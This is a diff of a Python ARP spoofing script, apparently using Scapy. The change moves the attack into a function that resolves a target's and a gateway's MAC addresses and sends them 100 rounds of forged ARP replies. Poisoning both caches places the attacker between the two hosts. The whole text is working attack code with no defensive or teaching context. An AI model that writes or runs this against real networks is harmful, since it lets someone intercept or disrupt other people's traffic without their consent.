@@ -19,16 +19,17 @@ def sendspoofedreply(targetip, targetmac, sourceip): # wysyłamy odpowiedzi ze z
     spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
     send(spoofed, verbose=False)
 
+def main_function():
+    targetMAC = getMACAddress(targetip)
 
-targetMAC = getMACAddress(targetip)
-print('Mac address of target: ', targetMAC)
-gatewayMAC = getMACAddress(gatewayip)
-print('Mac address of gateway: ', gatewayMAC)
+    gatewayMAC = getMACAddress(gatewayip)
 
-# spoofing
-try:
-    for i in range(10):
-        sendspoofedreply(targetip, targetMAC, gatewayip)
-        sendspoofedreply(gatewayip, gatewayMAC, targetip)
-except KeyboardInterrupt:
-    print('Stop spoofing')
+
+    # spoofing
+    try:
+        for i in range(100):
+            sendspoofedreply(targetip, targetMAC, gatewayip)
+            sendspoofedreply(gatewayip, gatewayMAC, targetip)
+    except KeyboardInterrupt:
+        print('Stop spoofing')
+    return 'Spoofing done-> \nTarget MAC: ', targetMAC, ' \n Gateway MAC: ', gatewayMAC
